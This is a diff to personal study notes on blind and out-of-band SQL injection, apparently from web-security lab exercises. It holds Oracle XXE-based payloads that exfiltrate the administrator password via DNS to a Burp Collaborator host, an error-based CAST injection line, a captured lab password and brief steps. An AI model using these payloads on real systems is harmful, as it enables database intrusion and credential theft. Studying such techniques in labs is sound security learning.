@@ -345,3 +345,15 @@ Cookie: TrackingId='+AND+1%3dCAST((SELECT+password+from+users+LIMIT+1)+as+int)--
 > OAST -> Out of band Application Security Testing 
 - Blind SQL injection is a type of SQL injection where an attacker exploits a vulnerability but does **not receive direct feedback** from the database in the form of error messages or visible data. Instead, they infer the database's response through **delays, conditional response or external interactions**.
 - Out-of-Band (OOB)SQL Injection a special type of blind SQL Injection that relies on **external communication** (such as DNS or HTTP requests) to **extract data** from the database when in-band methods (like using messages or timing delays) are not available.
+
+```bash
+211l156wno9r15afmxc2h8zj6ac10rog.oastify.com
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://zlokty6nr3gjer9tg27cvnkh58bzzpne.oastify.com/"> %remote;]>'),'/l') FROM dual)-- # Encode this payload
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.211l156wno9r15afmxc2h8zj6ac10rog.oastify.com/"> %remote;]>'),'/l') FROM dual)-- # Encode the payload, restart the burp to correctly work the collabrator
+```
+- Steps This is the password ```bsvviwyd47i0sh97te3c```
+    - First capture the request find the vulnerable parameter.
+    - Start burp collabrator then, craft the payload the according the website and Database type
+    - check the burp collabrator's **DNS** response like below image.
+    
+![Burp Collabrator Password](Images/SQL_OOB_Collabrator_DNS_Password.png)
